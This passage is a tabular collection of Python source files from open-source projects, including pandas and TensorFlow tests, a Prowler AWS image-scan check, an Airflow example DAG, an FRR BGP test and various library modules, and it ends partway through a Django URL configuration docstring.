id	filename	content
JY321	JY321-rstu_api_test.py	"import pytest
import pytest_asyncio

from rtsu_students_bot.rtsu import RTSUApi

pytest_plugins = ('pytest_asyncio',)

TEST_DATA = {
    ""login"": ""your login"",
    ""password"": ""your pass"",
}


@pytest_asyncio.fixture()
async def rtsu_client():
    """"""
    Initializes client
    :return: Prepared `RTSUApi` client
    """"""

    async with RTSUApi() as api:
        yield api


@pytest.mark.asyncio
async def test_rtsu_login(rtsu_client: RTSUApi):
    """"""
    Tests rtsu login
    :param rtsu_client: A RTSU API client
    :return:
    """"""

    resp = await rtsu_client.auth(TEST_DATA.get(""login""), TEST_DATA.get(""password""))

    assert resp.token is not None


@pytest.mark.asyncio
async def test_rtsu_profile_fetching(rtsu_client: RTSUApi):
    """"""
    Tests rtsu profile fetching
    :param rtsu_client:
    :return:
    """"""

    await rtsu_client.auth(TEST_DATA.get(""login""), TEST_DATA.get(""password""))

    profile = await rtsu_client.get_profile()

    assert profile is not None
    assert profile.full_name is not None


@pytest.mark.asyncio
async def test_rtsu_academic_years_fetching(rtsu_client: RTSUApi):
    """"""
    Tests rtsu academic years fetching
    :param rtsu_client:
    :return:
    """"""

    await rtsu_client.auth(TEST_DATA.get(""login""), TEST_DATA.get(""password""))

    years = await rtsu_client.get_academic_years()

    assert type(years) == list
    assert len(years) > 0


@pytest.mark.asyncio
async def test_rtsu_academic_year_subjects_fetching(rtsu_client: RTSUApi):
    """"""
    Tests rtsu academic year fetching
    :param rtsu_client:
    :return:
    """"""

    await rtsu_client.auth(TEST_DATA.get(""login""), TEST_DATA.get(""password""))

    ac_years = await rtsu_client.get_academic_years()
    year = ac_years[0].id
    years = await rtsu_client.get_academic_year_subjects(year)

    assert type(years) == list
    assert len(years) > 0"
JY555	JY555-test_ccalendar.py	"from datetime import (
    date,
    datetime,
)

from hypothesis import given
import numpy as np
import pytest

from pandas._libs.tslibs import ccalendar

from pandas._testing._hypothesis import DATETIME_IN_PD_TIMESTAMP_RANGE_NO_TZ


@pytest.mark.parametrize(
    ""date_tuple,expected"",
    [
        ((2001, 3, 1), 60),
        ((2004, 3, 1), 61),
        ((1907, 12, 31), 365),  # End-of-year, non-leap year.
        ((2004, 12, 31), 366),  # End-of-year, leap year.
    ],
)
def test_get_day_of_year_numeric(date_tuple, expected):
    assert ccalendar.get_day_of_year(*date_tuple) == expected


def test_get_day_of_year_dt():
    dt = datetime.fromordinal(1 + np.random.randint(365 * 4000))
    result = ccalendar.get_day_of_year(dt.year, dt.month, dt.day)

    expected = (dt - dt.replace(month=1, day=1)).days + 1
    assert result == expected


@pytest.mark.parametrize(
    ""input_date_tuple, expected_iso_tuple"",
    [
        [(2020, 1, 1), (2020, 1, 3)],
        [(2019, 12, 31), (2020, 1, 2)],
        [(2019, 12, 30), (2020, 1, 1)],
        [(2009, 12, 31), (2009, 53, 4)],
        [(2010, 1, 1), (2009, 53, 5)],
        [(2010, 1, 3), (2009, 53, 7)],
        [(2010, 1, 4), (2010, 1, 1)],
        [(2006, 1, 1), (2005, 52, 7)],
        [(2005, 12, 31), (2005, 52, 6)],
        [(2008, 12, 28), (2008, 52, 7)],
        [(2008, 12, 29), (2009, 1, 1)],
    ],
)
def test_dt_correct_iso_8601_year_week_and_day(input_date_tuple, expected_iso_tuple):
    result = ccalendar.get_iso_calendar(*input_date_tuple)
    expected_from_date_isocalendar = date(*input_date_tuple).isocalendar()
    assert result == expected_from_date_isocalendar
    assert result == expected_iso_tuple


@given(DATETIME_IN_PD_TIMESTAMP_RANGE_NO_TZ)
def test_isocalendar(dt):
    expected = dt.isocalendar()
    result = ccalendar.get_iso_calendar(dt.year, dt.month, dt.day)
    assert result == expected"
JY0	JY0-box_coder_test.py	"# Copyright 2017 The TensorFlow Authors. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
# ==============================================================================

""""""Tests for object_detection.core.box_coder.""""""

import tensorflow as tf

from object_detection.core import box_coder
from object_detection.core import box_list


class MockBoxCoder(box_coder.BoxCoder):
  """"""Test BoxCoder that encodes/decodes using the multiply-by-two function.""""""

  def code_size(self):
    return 4

  def _encode(self, boxes, anchors):
    return 2.0 * boxes.get()

  def _decode(self, rel_codes, anchors):
    return box_list.BoxList(rel_codes / 2.0)


class BoxCoderTest(tf.test.TestCase):

  def test_batch_decode(self):
    mock_anchor_corners = tf.constant(
        [[0, 0.1, 0.2, 0.3], [0.2, 0.4, 0.4, 0.6]], tf.float32)
    mock_anchors = box_list.BoxList(mock_anchor_corners)
    mock_box_coder = MockBoxCoder()

    expected_boxes = [[[0.0, 0.1, 0.5, 0.6], [0.5, 0.6, 0.7, 0.8]],
                      [[0.1, 0.2, 0.3, 0.4], [0.7, 0.8, 0.9, 1.0]]]

    encoded_boxes_list = [mock_box_coder.encode(
        box_list.BoxList(tf.constant(boxes)), mock_anchors)
                          for boxes in expected_boxes]
    encoded_boxes = tf.stack(encoded_boxes_list)
    decoded_boxes = box_coder.batch_decode(
        encoded_boxes, mock_box_coder, mock_anchors)

    with self.test_session() as sess:
      decoded_boxes_result = sess.run(decoded_boxes)
      self.assertAllClose(expected_boxes, decoded_boxes_result)


if __name__ == '__main__':
  tf.test.main()"
JY458	JY458-test_unique.py	"from datetime import (
    datetime,
    timedelta,
)

from pandas import (
    DatetimeIndex,
    NaT,
    Timestamp,
)
import pandas._testing as tm


def test_unique(tz_naive_fixture):

    idx = DatetimeIndex([""2017""] * 2, tz=tz_naive_fixture)
    expected = idx[:1]

    result = idx.unique()
    tm.assert_index_equal(result, expected)
    # GH#21737
    # Ensure the underlying data is consistent
    assert result[0] == expected[0]


def test_index_unique(rand_series_with_duplicate_datetimeindex):
    dups = rand_series_with_duplicate_datetimeindex
    index = dups.index

    uniques = index.unique()
    expected = DatetimeIndex(
        [
            datetime(2000, 1, 2),
            datetime(2000, 1, 3),
            datetime(2000, 1, 4),
            datetime(2000, 1, 5),
        ]
    )
    assert uniques.dtype == ""M8[ns]""  # sanity
    tm.assert_index_equal(uniques, expected)
    assert index.nunique() == 4

    # GH#2563
    assert isinstance(uniques, DatetimeIndex)

    dups_local = index.tz_localize(""US/Eastern"")
    dups_local.name = ""foo""
    result = dups_local.unique()
    expected = DatetimeIndex(expected, name=""foo"")
    expected = expected.tz_localize(""US/Eastern"")
    assert result.tz is not None
    assert result.name == ""foo""
    tm.assert_index_equal(result, expected)


def test_index_unique2():
    # NaT, note this is excluded
    arr = [1370745748 + t for t in range(20)] + [NaT.value]
    idx = DatetimeIndex(arr * 3)
    tm.assert_index_equal(idx.unique(), DatetimeIndex(arr))
    assert idx.nunique() == 20
    assert idx.nunique(dropna=False) == 21


def test_index_unique3():
    arr = [
        Timestamp(""2013-06-09 02:42:28"") + timedelta(seconds=t) for t in range(20)
    ] + [NaT]
    idx = DatetimeIndex(arr * 3)
    tm.assert_index_equal(idx.unique(), DatetimeIndex(arr))
    assert idx.nunique() == 20
    assert idx.nunique(dropna=False) == 21


def test_is_unique_monotonic(rand_series_with_duplicate_datetimeindex):
    index = rand_series_with_duplicate_datetimeindex.index
    assert not index.is_unique"
JY186	JY186-__init__.py	"# -*- coding: utf-8 -*-
""""""
Charset-Normalizer
~~~~~~~~~~~~~~
The Real First Universal Charset Detector.
A library that helps you read text from an unknown charset encoding.
Motivated by chardet, This package is trying to resolve the issue by taking a new approach.
All IANA character set names for which the Python core library provides codecs are supported.

Basic usage:
   >>> from charset_normalizer import from_bytes
   >>> results = from_bytes('Bсеки човек има право на образование. Oбразованието!'.encode('utf_8'))
   >>> best_guess = results.best()
   >>> str(best_guess)
   'Bсеки човек има право на образование. Oбразованието!'

Others methods and usages are available - see the full documentation
at <https://github.com/Ousret/charset_normalizer>.
:copyright: (c) 2021 by Ahmed TAHRI
:license: MIT, see LICENSE for more details.
""""""
import logging

from .api import from_bytes, from_fp, from_path, normalize
from .legacy import (
    CharsetDetector,
    CharsetDoctor,
    CharsetNormalizerMatch,
    CharsetNormalizerMatches,
    detect,
)
from .models import CharsetMatch, CharsetMatches
from .utils import set_logging_handler
from .version import VERSION, __version__

__all__ = (
    ""from_fp"",
    ""from_path"",
    ""from_bytes"",
    ""normalize"",
    ""detect"",
    ""CharsetMatch"",
    ""CharsetMatches"",
    ""CharsetNormalizerMatch"",
    ""CharsetNormalizerMatches"",
    ""CharsetDetector"",
    ""CharsetDoctor"",
    ""__version__"",
    ""VERSION"",
    ""set_logging_handler"",
)

# Attach a NullHandler to the top level logger by default
# https://docs.python.org/3.3/howto/logging.html#configuring-logging-for-a-library

logging.getLogger(""charset_normalizer"").addHandler(logging.NullHandler())"
JD487	JD487-lex_attrs.py	"# coding: utf8
from __future__ import unicode_literals

from ...attrs import LIKE_NUM


_num_words = [
    ""zero"",
    ""um"",
    ""dois"",
    ""três"",
    ""tres"",
    ""quatro"",
    ""cinco"",
    ""seis"",
    ""sete"",
    ""oito"",
    ""nove"",
    ""dez"",
    ""onze"",
    ""doze"",
    ""dúzia"",
    ""dúzias"",
    ""duzia"",
    ""duzias"",
    ""treze"",
    ""catorze"",
    ""quinze"",
    ""dezasseis"",
    ""dezassete"",
    ""dezoito"",
    ""dezanove"",
    ""vinte"",
    ""trinta"",
    ""quarenta"",
    ""cinquenta"",
    ""sessenta"",
    ""setenta"",
    ""oitenta"",
    ""noventa"",
    ""cem"",
    ""cento"",
    ""duzentos"",
    ""trezentos"",
    ""quatrocentos"",
    ""quinhentos"",
    ""seicentos"",
    ""setecentos"",
    ""oitocentos"",
    ""novecentos"",
    ""mil"",
    ""milhão"",
    ""milhao"",
    ""milhões"",
    ""milhoes"",
    ""bilhão"",
    ""bilhao"",
    ""bilhões"",
    ""bilhoes"",
    ""trilhão"",
    ""trilhao"",
    ""trilhões"",
    ""trilhoes"",
    ""quadrilhão"",
    ""quadrilhao"",
    ""quadrilhões"",
    ""quadrilhoes"",
]


_ordinal_words = [
    ""primeiro"",
    ""segundo"",
    ""terceiro"",
    ""quarto"",
    ""quinto"",
    ""sexto"",
    ""sétimo"",
    ""oitavo"",
    ""nono"",
    ""décimo"",
    ""vigésimo"",
    ""trigésimo"",
    ""quadragésimo"",
    ""quinquagésimo"",
    ""sexagésimo"",
    ""septuagésimo"",
    ""octogésimo"",
    ""nonagésimo"",
    ""centésimo"",
    ""ducentésimo"",
    ""trecentésimo"",
    ""quadringentésimo"",
    ""quingentésimo"",
    ""sexcentésimo"",
    ""septingentésimo"",
    ""octingentésimo"",
    ""nongentésimo"",
    ""milésimo"",
    ""milionésimo"",
    ""bilionésimo"",
]


def like_num(text):
    if text.startswith((""+"", ""-"", ""±"", ""~"")):
        text = text[1:]
    text = text.replace("","", """").replace(""."", """").replace(""º"", """").replace(""ª"", """")
    if text.isdigit():
        return True
    if text.count(""/"") == 1:
        num, denom = text.split(""/"")
        if num.isdigit() and denom.isdigit():
            return True
    if text.lower() in _num_words:
        return True
    if text.lower() in _ordinal_words:
        return True
    return False


LEX_ATTRS = {LIKE_NUM: like_num}"
JY124	JY124-sql.py	"import sys

from django.apps import apps
from django.db import models


def sql_flush(style, connection, reset_sequences=True, allow_cascade=False):
    """"""
    Return a list of the SQL statements used to flush the database.
    """"""
    tables = connection.introspection.django_table_names(
        only_existing=True, include_views=False
    )
    return connection.ops.sql_flush(
        style,
        tables,
        reset_sequences=reset_sequences,
        allow_cascade=allow_cascade,
    )


def emit_pre_migrate_signal(verbosity, interactive, db, **kwargs):
    # Emit the pre_migrate signal for every application.
    for app_config in apps.get_app_configs():
        if app_config.models_module is None:
            continue
        if verbosity >= 2:
            stdout = kwargs.get(""stdout"", sys.stdout)
            stdout.write(
                ""Running pre-migrate handlers for application %s"" % app_config.label
            )
        models.signals.pre_migrate.send(
            sender=app_config,
            app_config=app_config,
            verbosity=verbosity,
            interactive=interactive,
            using=db,
            **kwargs,
        )


def emit_post_migrate_signal(verbosity, interactive, db, **kwargs):
    # Emit the post_migrate signal for every application.
    for app_config in apps.get_app_configs():
        if app_config.models_module is None:
            continue
        if verbosity >= 2:
            stdout = kwargs.get(""stdout"", sys.stdout)
            stdout.write(
                ""Running post-migrate handlers for application %s"" % app_config.label
            )
        models.signals.post_migrate.send(
            sender=app_config,
            app_config=app_config,
            verbosity=verbosity,
            interactive=interactive,
            using=db,
            **kwargs,
        )"
JD429	JD429-list_clusters.py	"#!/usr/bin/env python

# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""""" Sample command-line program to list Cloud Dataproc clusters in a region.

Example usage:
python list_clusters.py --project_id=my-project-id --region=global

""""""
import argparse

from google.cloud import dataproc_v1


# [START dataproc_list_clusters]
def list_clusters(dataproc, project, region):
    """"""List the details of clusters in the region.""""""
    for cluster in dataproc.list_clusters(
        request={""project_id"": project, ""region"": region}
    ):
        print((""{} - {}"".format(cluster.cluster_name, cluster.status.state.name)))


# [END dataproc_list_clusters]


def main(project_id, region):

    if region == ""global"":
        # Use the default gRPC global endpoints.
        dataproc_cluster_client = dataproc_v1.ClusterControllerClient()
    else:
        # Use a regional gRPC endpoint. See:
        # https://cloud.google.com/dataproc/docs/concepts/regional-endpoints
        dataproc_cluster_client = dataproc_v1.ClusterControllerClient(
            client_options={""api_endpoint"": f""{region}-dataproc.googleapis.com:443""}
        )

    list_clusters(dataproc_cluster_client, project_id, region)


if __name__ == ""__main__"":
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=(argparse.RawDescriptionHelpFormatter)
    )
    parser.add_argument(""--project_id"", help=""Project ID to access."", required=True)
    parser.add_argument(""--region"", help=""Region of clusters to list."", required=True)

    args = parser.parse_args()
    main(args.project_id, args.region)"
JD347	JD347-ecr_repositories_scan_vulnerabilities_in_latest_image.py	"from prowler.lib.check.models import Check, Check_Report_AWS
from prowler.providers.aws.services.ecr.ecr_client import ecr_client


class ecr_repositories_scan_vulnerabilities_in_latest_image(Check):
    def execute(self):
        findings = []
        for repository in ecr_client.repositories:
            for image in repository.images_details:
                report = Check_Report_AWS(self.metadata())
                report.region = repository.region
                report.resource_id = repository.name
                report.resource_arn = repository.arn
                report.status = ""PASS""
                report.status_extended = f""ECR repository {repository.name} has imageTag {image.latest_tag} scanned without findings""
                if not image.scan_findings_status:
                    report.status = ""FAIL""
                    report.status_extended = f""ECR repository {repository.name} has imageTag {image.latest_tag} without a scan""
                elif image.scan_findings_status == ""FAILED"":
                    report.status = ""FAIL""
                    report.status_extended = (
                        f""ECR repository {repository.name} with scan status FAILED""
                    )
                elif image.scan_findings_status != ""FAILED"":
                    if image.scan_findings_severity_count and (
                        image.scan_findings_severity_count.critical
                        or image.scan_findings_severity_count.high
                        or image.scan_findings_severity_count.medium
                    ):
                        report.status = ""FAIL""
                        report.status_extended = f""ECR repository {repository.name} has imageTag {image.latest_tag} scanned with findings: CRITICAL->{image.scan_findings_severity_count.critical}, HIGH->{image.scan_findings_severity_count.high}, MEDIUM->{image.scan_findings_severity_count.medium} ""

                findings.append(report)

        return findings"
JY68	JY68-typedefs.py	"import json
import os
import sys
from typing import (
    TYPE_CHECKING,
    Any,
    Awaitable,
    Callable,
    Iterable,
    Mapping,
    Tuple,
    Union,
)

from multidict import CIMultiDict, CIMultiDictProxy, MultiDict, MultiDictProxy, istr
from yarl import URL

# These are for other modules to use (to avoid repeating the conditional import).
if sys.version_info >= (3, 8):
    from typing import Final as Final, Protocol as Protocol, TypedDict as TypedDict
else:
    from typing_extensions import (  # noqa: F401
        Final,
        Protocol as Protocol,
        TypedDict as TypedDict,
    )

DEFAULT_JSON_ENCODER = json.dumps
DEFAULT_JSON_DECODER = json.loads

if TYPE_CHECKING:  # pragma: no cover
    _CIMultiDict = CIMultiDict[str]
    _CIMultiDictProxy = CIMultiDictProxy[str]
    _MultiDict = MultiDict[str]
    _MultiDictProxy = MultiDictProxy[str]
    from http.cookies import BaseCookie, Morsel

    from .web import Request, StreamResponse
else:
    _CIMultiDict = CIMultiDict
    _CIMultiDictProxy = CIMultiDictProxy
    _MultiDict = MultiDict
    _MultiDictProxy = MultiDictProxy

Byteish = Union[bytes, bytearray, memoryview]
JSONEncoder = Callable[[Any], str]
JSONDecoder = Callable[[str], Any]
LooseHeaders = Union[Mapping[Union[str, istr], str], _CIMultiDict, _CIMultiDictProxy]
RawHeaders = Tuple[Tuple[bytes, bytes], ...]
StrOrURL = Union[str, URL]

LooseCookiesMappings = Mapping[str, Union[str, ""BaseCookie[str]"", ""Morsel[Any]""]]
LooseCookiesIterables = Iterable[
    Tuple[str, Union[str, ""BaseCookie[str]"", ""Morsel[Any]""]]
]
LooseCookies = Union[
    LooseCookiesMappings,
    LooseCookiesIterables,
    ""BaseCookie[str]"",
]

Handler = Callable[[""Request""], Awaitable[""StreamResponse""]]

PathLike = Union[str, ""os.PathLike[str]""]"
JD493	JD493-test_bgp_ipv6_ll_peering.py	"#!/usr/bin/env python
# SPDX-License-Identifier: ISC

#
# Copyright (c) 2023 by
# Donatas Abraitis <donatas@opensourcerouting.org>
#

""""""
Check if IPv6 Link-Local BGP peering works fine.
""""""

import os
import sys
import json
import pytest
import functools

CWD = os.path.dirname(os.path.realpath(__file__))
sys.path.append(os.path.join(CWD, ""../""))

# pylint: disable=C0413
from lib import topotest
from lib.topogen import Topogen, TopoRouter, get_topogen

pytestmark = [pytest.mark.bgpd]


def build_topo(tgen):
    for routern in range(1, 3):
        tgen.add_router(""r{}"".format(routern))

    switch = tgen.add_switch(""s1"")
    switch.add_link(tgen.gears[""r1""])
    switch.add_link(tgen.gears[""r2""])


def setup_module(mod):
    tgen = Topogen(build_topo, mod.__name__)
    tgen.start_topology()

    router_list = tgen.routers()

    for i, (rname, router) in enumerate(router_list.items(), 1):
        router.load_config(
            TopoRouter.RD_ZEBRA, os.path.join(CWD, ""{}/zebra.conf"".format(rname))
        )
        router.load_config(
            TopoRouter.RD_BGP, os.path.join(CWD, ""{}/bgpd.conf"".format(rname))
        )

    tgen.start_router()


def teardown_module(mod):
    tgen = get_topogen()
    tgen.stop_topology()


def test_bgp_ipv6_link_local_peering():
    tgen = get_topogen()

    if tgen.routers_have_failure():
        pytest.skip(tgen.errors)

    r1 = tgen.gears[""r1""]

    def _bgp_converge():
        output = json.loads(r1.vtysh_cmd(""show bgp summary json""))
        expected = {
            ""ipv4Unicast"": {
                ""peers"": {
                    ""fe80:1::2"": {
                        ""state"": ""Established"",
                    }
                }
            }
        }
        return topotest.json_cmp(output, expected)

    test_func = functools.partial(_bgp_converge)
    _, result = topotest.run_and_expect(test_func, None, count=60, wait=0.5)
    assert result is None, ""Failed to see BGP convergence on R2""


if __name__ == ""__main__"":
    args = [""-s""] + sys.argv[1:]
    sys.exit(pytest.main(args))"
JD24	JD24-pydevd_frame_eval_main.py	"import os

from _pydev_bundle import pydev_log
from _pydevd_bundle.pydevd_trace_dispatch import USING_CYTHON
from _pydevd_bundle.pydevd_constants import USE_CYTHON_FLAG, ENV_FALSE_LOWER_VALUES, \
    ENV_TRUE_LOWER_VALUES, IS_PY36_OR_GREATER, IS_PY38_OR_GREATER, SUPPORT_GEVENT, IS_PYTHON_STACKLESS, \
    PYDEVD_USE_FRAME_EVAL, PYDEVD_IPYTHON_COMPATIBLE_DEBUGGING

frame_eval_func = None
stop_frame_eval = None
dummy_trace_dispatch = None
clear_thread_local_info = None

# ""NO"" means we should not use frame evaluation, 'YES' we should use it (and fail if not there) and unspecified uses if possible.
if (
        PYDEVD_USE_FRAME_EVAL in ENV_FALSE_LOWER_VALUES or
        USE_CYTHON_FLAG in ENV_FALSE_LOWER_VALUES or
        not USING_CYTHON or

        # Frame eval mode does not work with ipython compatible debugging (this happens because the
        # way that frame eval works is run untraced and set tracing only for the frames with
        # breakpoints, but ipython compatible debugging creates separate frames for what's logically
        # the same frame).
        PYDEVD_IPYTHON_COMPATIBLE_DEBUGGING
    ):
    USING_FRAME_EVAL = False

elif SUPPORT_GEVENT or (IS_PYTHON_STACKLESS and not IS_PY38_OR_GREATER):
    USING_FRAME_EVAL = False
    # i.e gevent and frame eval mode don't get along very well.
    # https://github.com/microsoft/debugpy/issues/189
    # Same problem with Stackless.
    # https://github.com/stackless-dev/stackless/issues/240

elif PYDEVD_USE_FRAME_EVAL in ENV_TRUE_LOWER_VALUES:
    # Fail if unable to use
    from _pydevd_frame_eval.pydevd_frame_eval_cython_wrapper import frame_eval_func, stop_frame_eval, dummy_trace_dispatch, clear_thread_local_info
    USING_FRAME_EVAL = True

else:
    USING_FRAME_EVAL = False
    # Try to use if possible
    if IS_PY36_OR_GREATER:
        try:
            from _pydevd_frame_eval.pydevd_frame_eval_cython_wrapper import frame_eval_func, stop_frame_eval, dummy_trace_dispatch, clear_thread_local_info
            USING_FRAME_EVAL = True
        except ImportError:
            pydev_log.show_compile_cython_command_line()"
JD41	JD41-CR.py	"# flake8: noqa
# errmsg.h
CR_ERROR_FIRST = 2000
CR_UNKNOWN_ERROR = 2000
CR_SOCKET_CREATE_ERROR = 2001
CR_CONNECTION_ERROR = 2002
CR_CONN_HOST_ERROR = 2003
CR_IPSOCK_ERROR = 2004
CR_UNKNOWN_HOST = 2005
CR_SERVER_GONE_ERROR = 2006
CR_VERSION_ERROR = 2007
CR_OUT_OF_MEMORY = 2008
CR_WRONG_HOST_INFO = 2009
CR_LOCALHOST_CONNECTION = 2010
CR_TCP_CONNECTION = 2011
CR_SERVER_HANDSHAKE_ERR = 2012
CR_SERVER_LOST = 2013
CR_COMMANDS_OUT_OF_SYNC = 2014
CR_NAMEDPIPE_CONNECTION = 2015
CR_NAMEDPIPEWAIT_ERROR = 2016
CR_NAMEDPIPEOPEN_ERROR = 2017
CR_NAMEDPIPESETSTATE_ERROR = 2018
CR_CANT_READ_CHARSET = 2019
CR_NET_PACKET_TOO_LARGE = 2020
CR_EMBEDDED_CONNECTION = 2021
CR_PROBE_SLAVE_STATUS = 2022
CR_PROBE_SLAVE_HOSTS = 2023
CR_PROBE_SLAVE_CONNECT = 2024
CR_PROBE_MASTER_CONNECT = 2025
CR_SSL_CONNECTION_ERROR = 2026
CR_MALFORMED_PACKET = 2027
CR_WRONG_LICENSE = 2028

CR_NULL_POINTER = 2029
CR_NO_PREPARE_STMT = 2030
CR_PARAMS_NOT_BOUND = 2031
CR_DATA_TRUNCATED = 2032
CR_NO_PARAMETERS_EXISTS = 2033
CR_INVALID_PARAMETER_NO = 2034
CR_INVALID_BUFFER_USE = 2035
CR_UNSUPPORTED_PARAM_TYPE = 2036

CR_SHARED_MEMORY_CONNECTION = 2037
CR_SHARED_MEMORY_CONNECT_REQUEST_ERROR = 2038
CR_SHARED_MEMORY_CONNECT_ANSWER_ERROR = 2039
CR_SHARED_MEMORY_CONNECT_FILE_MAP_ERROR = 2040
CR_SHARED_MEMORY_CONNECT_MAP_ERROR = 2041
CR_SHARED_MEMORY_FILE_MAP_ERROR = 2042
CR_SHARED_MEMORY_MAP_ERROR = 2043
CR_SHARED_MEMORY_EVENT_ERROR = 2044
CR_SHARED_MEMORY_CONNECT_ABANDONED_ERROR = 2045
CR_SHARED_MEMORY_CONNECT_SET_ERROR = 2046
CR_CONN_UNKNOW_PROTOCOL = 2047
CR_INVALID_CONN_HANDLE = 2048
CR_SECURE_AUTH = 2049
CR_FETCH_CANCELED = 2050
CR_NO_DATA = 2051
CR_NO_STMT_METADATA = 2052
CR_NO_RESULT_SET = 2053
CR_NOT_IMPLEMENTED = 2054
CR_SERVER_LOST_EXTENDED = 2055
CR_STMT_CLOSED = 2056
CR_NEW_STMT_METADATA = 2057
CR_ALREADY_CONNECTED = 2058
CR_AUTH_PLUGIN_CANNOT_LOAD = 2059
CR_DUPLICATE_CONNECTION_ATTR = 2060
CR_AUTH_PLUGIN_ERR = 2061
CR_ERROR_LAST = 2061"
JY294	JY294-example_branch_operator.py	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
""""""Example DAG demonstrating the usage of the BranchPythonOperator.""""""
from __future__ import annotations

import random

import pendulum

from airflow import DAG
from airflow.operators.empty import EmptyOperator
from airflow.operators.python import BranchPythonOperator
from airflow.utils.edgemodifier import Label
from airflow.utils.trigger_rule import TriggerRule

with DAG(
    dag_id=""example_branch_operator"",
    start_date=pendulum.datetime(2021, 1, 1, tz=""UTC""),
    catchup=False,
    schedule=""@daily"",
    tags=[""example"", ""example2""],
) as dag:
    run_this_first = EmptyOperator(
        task_id=""run_this_first"",
    )

    options = [""branch_a"", ""branch_b"", ""branch_c"", ""branch_d""]

    branching = BranchPythonOperator(
        task_id=""branching"",
        python_callable=lambda: random.choice(options),
    )
    run_this_first >> branching

    join = EmptyOperator(
        task_id=""join"",
        trigger_rule=TriggerRule.NONE_FAILED_MIN_ONE_SUCCESS,
    )

    for option in options:
        t = EmptyOperator(
            task_id=option,
        )

        empty_follow = EmptyOperator(
            task_id=""follow_"" + option,
        )

        # Label is optional here, but it can help identify more complex branches
        branching >> Label(option) >> t >> empty_follow >> join"
JD514	JD514-test_to_frame.py	"from pandas import (
    DataFrame,
    Index,
    Series,
)
import pandas._testing as tm


class TestToFrame:
    def test_to_frame_respects_name_none(self):
        # GH#44212 if we explicitly pass name=None, then that should be respected,
        #  not changed to 0
        # GH-45448 this is first deprecated to only change in the future
        ser = Series(range(3))
        with tm.assert_produces_warning(FutureWarning):
            result = ser.to_frame(None)

        # exp_index = Index([None], dtype=object)
        exp_index = Index([0])
        tm.assert_index_equal(result.columns, exp_index)

        with tm.assert_produces_warning(FutureWarning):
            result = ser.rename(""foo"").to_frame(None)
        exp_index = Index([""foo""], dtype=object)
        tm.assert_index_equal(result.columns, exp_index)

    def test_to_frame(self, datetime_series):
        datetime_series.name = None
        rs = datetime_series.to_frame()
        xp = DataFrame(datetime_series.values, index=datetime_series.index)
        tm.assert_frame_equal(rs, xp)

        datetime_series.name = ""testname""
        rs = datetime_series.to_frame()
        xp = DataFrame(
            {""testname"": datetime_series.values}, index=datetime_series.index
        )
        tm.assert_frame_equal(rs, xp)

        rs = datetime_series.to_frame(name=""testdifferent"")
        xp = DataFrame(
            {""testdifferent"": datetime_series.values}, index=datetime_series.index
        )
        tm.assert_frame_equal(rs, xp)

    def test_to_frame_expanddim(self):
        # GH#9762

        class SubclassedSeries(Series):
            @property
            def _constructor_expanddim(self):
                return SubclassedFrame

        class SubclassedFrame(DataFrame):
            pass

        ser = SubclassedSeries([1, 2, 3], name=""X"")
        result = ser.to_frame()
        assert isinstance(result, SubclassedFrame)
        expected = SubclassedFrame({""X"": [1, 2, 3]})
        tm.assert_frame_equal(result, expected)"
JY37	JY37-faster_rcnn_regnetx-3.2GF_fpn_1x_coco.py	"_base_ = [
    '../_base_/models/faster_rcnn_r50_fpn.py',
    '../_base_/datasets/coco_detection.py',
    '../_base_/schedules/schedule_1x.py', '../_base_/default_runtime.py'
]
model = dict(
    backbone=dict(
        _delete_=True,
        type='RegNet',
        arch='regnetx_3.2gf',
        out_indices=(0, 1, 2, 3),
        frozen_stages=1,
        norm_cfg=dict(type='BN', requires_grad=True),
        norm_eval=True,
        style='pytorch',
        init_cfg=dict(
            type='Pretrained', checkpoint='open-mmlab://regnetx_3.2gf')),
    neck=dict(
        type='FPN',
        in_channels=[96, 192, 432, 1008],
        out_channels=256,
        num_outs=5))
img_norm_cfg = dict(
    # The mean and std are used in PyCls when training RegNets
    mean=[103.53, 116.28, 123.675],
    std=[57.375, 57.12, 58.395],
    to_rgb=False)
train_pipeline = [
    dict(type='LoadImageFromFile'),
    dict(type='LoadAnnotations', with_bbox=True),
    dict(type='Resize', img_scale=(1333, 800), keep_ratio=True),
    dict(type='RandomFlip', flip_ratio=0.5),
    dict(type='Normalize', **img_norm_cfg),
    dict(type='Pad', size_divisor=32),
    dict(type='DefaultFormatBundle'),
    dict(type='Collect', keys=['img', 'gt_bboxes', 'gt_labels']),
]
test_pipeline = [
    dict(type='LoadImageFromFile'),
    dict(
        type='MultiScaleFlipAug',
        img_scale=(1333, 800),
        flip=False,
        transforms=[
            dict(type='Resize', keep_ratio=True),
            dict(type='RandomFlip'),
            dict(type='Normalize', **img_norm_cfg),
            dict(type='Pad', size_divisor=32),
            dict(type='ImageToTensor', keys=['img']),
            dict(type='Collect', keys=['img']),
        ])
]
data = dict(
    train=dict(pipeline=train_pipeline),
    val=dict(pipeline=test_pipeline),
    test=dict(pipeline=test_pipeline))
optimizer = dict(type='SGD', lr=0.02, momentum=0.9, weight_decay=0.00005)"
JD495	JD495-urls.py	"""""""uestc URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/1.9/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
